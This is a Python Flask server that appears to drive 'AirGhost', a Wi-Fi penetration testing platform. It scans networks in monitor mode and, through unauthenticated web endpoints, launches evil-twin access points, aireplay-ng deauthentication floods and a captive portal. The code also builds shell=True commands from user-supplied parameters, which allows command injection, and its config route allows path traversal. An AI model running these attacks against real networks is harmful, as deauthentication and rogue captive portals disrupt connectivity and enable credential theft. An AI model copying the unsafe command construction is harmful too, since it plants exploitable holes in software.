#!/usr/bin/env python3
#
# AirGhost Backend Server
# Powers the web interface for the AirGhost Wi-Fi Penetration Testing Platform
#

import os
import sys
import json
import time
import logging
import subprocess
import signal
import netifaces
import psutil
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_socketio import SocketIO
import threading
import re

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/airghost/logs/server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('airghost')

# Set up Flask app
app = Flask(__name__,
            static_folder='/opt/airghost/web/static',
            template_folder='/opt/airghost/web/templates')
app.config['SECRET_KEY'] = os.urandom(24).hex()
socketio = SocketIO(app)

# Global variables for tracking attack processes
active_attacks = {}
system_status = {
    'ap_running': False,
    'dhcp_running': False,
    'interfaces': {}
}

# Configuration paths
CONFIG_DIR = '/opt/airghost/config'
TEMPLATES_DIR = '/opt/airghost/templates'

# Attack commands
ATTACK_COMMANDS = {
    'evil_twin': {
        'start': 'hostapd {config_path} -B',
        'stop': 'pkill -f "hostapd {config_path}"'
    },
    'deauth': {
        'start': 'aireplay-ng --deauth {count} -a {bssid} {interface}',
        'stop': 'pkill -f "aireplay-ng --deauth"'
    },
    'captive_portal': {
        'start': 'dnsmasq -C {config_path} -d',
        'stop': 'pkill -f "dnsmasq -C {config_path}"'
    }
}

def load_config(config_name):
    """Load configuration from file"""
    config_path = os.path.join(CONFIG_DIR, f"{config_name}.conf")
    config = {}
    
    try:
        with open(config_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    key, value = line.split('=', 1)
                    config[key] = value
    except Exception as e:
        logger.error(f"Error loading {config_name} config: {e}")
    
    return config

def save_config(config_name, config):
    """Save configuration to file"""
    config_path = os.path.join(CONFIG_DIR, f"{config_name}.conf")
    
    try:
        with open(config_path, 'w') as f:
            for key, value in config.items():
                f.write(f"{key}={value}\n")
        return True
    except Exception as e:
        logger.error(f"Error saving {config_name} config: {e}")
        return False

def get_wireless_interfaces():
    """Get a list of wireless interfaces"""
    interfaces = []
    try:
        output = subprocess.check_output(['iw', 'dev'], universal_newlines=True)
        pattern = re.compile(r'Interface\s+(\w+)')
        interfaces = pattern.findall(output)
    except Exception as e:
        logger.error(f"Error getting wireless interfaces: {e}")
    
    return interfaces

def get_interface_mac(interface):
    """Get the MAC address of an interface"""
    try:
        mac = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
        return mac
    except Exception as e:
        logger.error(f"Error getting MAC address for {interface}: {e}")
        return "00:00:00:00:00:00"

def get_interface_status(interface):
    """Get the status of a wireless interface"""
    status = {
        'name': interface,
        'mac': get_interface_mac(interface),
        'channel': 'Unknown',
        'mode': 'Unknown',
        'power': 'Unknown',
        'status': 'Down'
    }
    
    try:
        # Check if interface is up
        with open(f"/sys/class/net/{interface}/operstate", 'r') as f:
            state = f.read().strip()
            status['status'] = 'Up' if state == 'up' else 'Down'
        
        # Get mode and channel
        output = subprocess.check_output(['iwconfig', interface], universal_newlines=True, stderr=subprocess.STDOUT)
        
        # Extract mode
        mode_match = re.search(r'Mode:(\w+)', output)
        if mode_match:
            status['mode'] = mode_match.group(1)
        
        # Extract channel
        channel_match = re.search(r'Channel=?(\d+)', output)
        if channel_match:
            status['channel'] = channel_match.group(1)
        
        # Extract power
        power_match = re.search(r'Tx-Power=?(\d+)', output)
        if power_match:
            status['power'] = f"{power_match.group(1)} dBm"
    except Exception as e:
        logger.error(f"Error getting status for {interface}: {e}")
    
    return status

def scan_networks(interface):
    """Scan for WiFi networks using a specific interface"""
    networks = []
    
    try:
        # Put interface in monitor mode
        subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['ip', 'link', 'set', interface, 'down'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['iw', interface, 'set', 'monitor', 'none'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Scan for networks
        cmd = f"timeout 10 airodump-ng {interface} --output-format csv -w /tmp/airghost_scan"
        subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Parse results
        csv_file = "/tmp/airghost_scan-01.csv"
        if os.path.exists(csv_file):
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                data = f.read()
            
            # Parse networks section
            networks_data = data.split('\r\n\r\n')[0].split('\r\n')[1:]
            for line in networks_data:
                if line.strip() and ',' in line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0].strip(),
                            'first_seen': parts[1].strip(),
                            'last_seen': parts[2].strip(),
                            'channel': parts[3].strip(),
                            'speed': parts[4].strip(),
                            'privacy': parts[5].strip(),
                            'cipher': parts[6].strip(),
                            'auth': parts[7].strip(),
                            'power': parts[8].strip(),
                            'beacons': parts[9].strip(),
                            'iv': parts[10].strip(),
                            'lan_ip': parts[11].strip(),
                            'id_length': parts[12].strip(),
                            'essid': parts[13].strip(),
                            'clients': []
                        }
                        networks.append(network)
            
            # Clean up
            os.remove(csv_file)
        
        # Put interface back in managed mode
        subprocess.run(['ip', 'link', 'set', interface, 'down'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['iw', interface, 'set', 'type', 'managed'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception as e:
        logger.error(f"Error scanning networks: {e}")
    
    return networks

def start_attack(attack_type, params):
    """Start an attack with the given parameters"""
    try:
        if attack_type in active_attacks and active_attacks[attack_type]['process']:
            # Attack already running
            return False, "Attack already running"
        
        cmd = ATTACK_COMMANDS[attack_type]['start'].format(**params)
        logger.info(f"Starting {attack_type} attack: {cmd}")
        
        # Start the attack
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Store process information
        active_attacks[attack_type] = {
            'process': process,
            'start_time': time.time(),
            'params': params
        }
        
        return True, f"{attack_type} attack started"
    except Exception as e:
        logger.error(f"Error starting {attack_type} attack: {e}")
        return False, str(e)

def stop_attack(attack_type):
    """Stop an attack"""
    try:
        if attack_type not in active_attacks or not active_attacks[attack_type]['process']:
            # Attack not running
            return False, "Attack not running"
        
        params = active_attacks[attack_type]['params']
        cmd = ATTACK_COMMANDS[attack_type]['stop'].format(**params)
        logger.info(f"Stopping {attack_type} attack: {cmd}")
        
        # Stop the attack
        subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Kill the process if still running
        process = active_attacks[attack_type]['process']
        if process.poll() is None:
            process.kill()
        
        # Clear process information
        active_attacks[attack_type] = {'process': None, 'params': {}}
        
        return True, f"{attack_type} attack stopped"
    except Exception as e:
        logger.error(f"Error stopping {attack_type} attack: {e}")
        return False, str(e)

def update_system_status():
    """Update and broadcast system status"""
    # Update interface status
    interfaces = get_wireless_interfaces()
    system_status['interfaces'] = {interface: get_interface_status(interface) for interface in interfaces}
    
    # Update services status
    system_status['ap_running'] = any(p.name() == 'hostapd' for p in psutil.process_iter(['name']))
    system_status['dhcp_running'] = any(p.name() == 'dnsmasq' for p in psutil.process_iter(['name']))
    
    # Broadcast status update
    socketio.emit('status_update', system_status)

@app.route('/')
def index():
    """Main page route"""
    return render_template('index.html')

@app.route('/status')
def status():
    """Get system status"""
    update_system_status()
    return jsonify(system_status)

@app.route('/interfaces')
def interfaces():
    """Get available interfaces"""
    interfaces = get_wireless_interfaces()
    interface_status = {interface: get_interface_status(interface) for interface in interfaces}
    return jsonify(interface_status)

@app.route('/scan', methods=['POST'])
def scan():
    """Scan for WiFi networks"""
    data = request.json
    interface = data.get('interface')
    
    if not interface:
        return jsonify({'success': False, 'message': 'No interface specified'})
    
    networks = scan_networks(interface)
    return jsonify({'success': True, 'networks': networks})

@app.route('/attack/start', methods=['POST'])
def start_attack_route():
    """Start an attack"""
    data = request.json
    attack_type = data.get('type')
    params = data.get('params', {})
    
    if not attack_type or attack_type not in ATTACK_COMMANDS:
        return jsonify({'success': False, 'message': 'Invalid attack type'})
    
    success, message = start_attack(attack_type, params)
    return jsonify({'success': success, 'message': message})

@app.route('/attack/stop', methods=['POST'])
def stop_attack_route():
    """Stop an attack"""
    data = request.json
    attack_type = data.get('type')
    
    if not attack_type or attack_type not in ATTACK_COMMANDS:
        return jsonify({'success': False, 'message': 'Invalid attack type'})
    
    success, message = stop_attack(attack_type)
    return jsonify({'success': success, 'message': message})

@app.route('/config/<config_name>', methods=['GET', 'POST'])
def config_route(config_name):
    """Get or update configuration"""
    if request.method == 'GET':
        config = load_config(config_name)
        return jsonify(config)
    elif request.method == 'POST':
        data = request.json
        success = save_config(config_name, data)
        return jsonify({'success': success})

@app.route('/templates')
def templates():
    """Get available captive portal templates"""
    templates = []
    try:
        for template_dir in os.listdir(TEMPLATES_DIR):
            template_path = os.path.join(TEMPLATES_DIR, template_dir)
            if os.path.isdir(template_path) and os.path.exists(os.path.join(template_path, 'config.json')):
                # Load template configuration
                with open(os.path.join(template_path, 'config.json'), 'r') as f:
                    template_config = json.load(f)
                templates.append({
                    'id': template_dir,
                    'name': template_config.get('name', template_dir),
                    'description': template_config.get('description', '')
                })
    except Exception as e:
        logger.error(f"Error listing templates: {e}")
    
    return jsonify(templates)

def status_update_loop():
    """Background thread for updating system status"""
    while True:
        update_system_status()
        time.sleep(5)  # Update every 5 seconds

@socketio.on('connect')
def on_connect():
    """SocketIO connection event"""
    update_system_status()

@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

def setup():
    """Setup function for initial configuration"""
    # Ensure directories exist
    os.makedirs(CONFIG_DIR, exist_ok=True)
    os.makedirs(TEMPLATES_DIR, exist_ok=True)
    os.makedirs('/opt/airghost/logs', exist_ok=True)
    
    # Start background status update thread
    threading.Thread(target=status_update_loop, daemon=True).start()

if __name__ == '__main__':
    # Set up signal handlers for graceful shutdown
    def signal_handler(sig, frame):
        logger.info("Shutdown signal received, cleaning up...")
        for attack_type in list(active_attacks.keys()):
            if active_attacks[attack_type].get('process'):
                stop_attack(attack_type)
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Setup and start server
    setup()
    logger.info("AirGhost server starting...")
    socketio.run(app, host='0.0.0.0', port=8080, debug=False)
